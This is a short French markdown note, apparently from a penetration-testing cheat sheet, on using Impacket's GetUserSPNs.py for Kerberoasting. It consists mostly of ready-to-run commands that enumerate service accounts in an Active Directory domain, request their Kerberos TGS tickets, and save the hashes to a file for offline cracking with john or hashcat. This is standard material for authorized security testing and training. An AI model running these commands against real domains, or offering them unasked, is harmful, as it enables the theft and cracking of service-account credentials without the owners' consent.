---
public: true # set to true to make the article publishable
---
## Impacket

### Utiliser GetUserSPNs.py

 Il réalise les opérations suivantes :

- découverte des SPNs
- Dump des TGS
- Obtention des Hashs

```shell
# remarque : on peut utliser -target-domain <domain> si on veut attaquer un autre domaine 

# Liste des comptes disposant d'un SPN
GetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD

# Récupération des TGS (ajout de -request)
GetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request

# Récupération d'un unique TGS
GetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request-user interesting.user

# Enregistrement des TGS pour les fournier à john / hashcat (fichier 'hashes.txt')
GetUserSPNs.py -dc-ip $TARGET $DOMAIN/$USER:$PASSWORD -request -outputfile hash_kerberoastables.txt

```
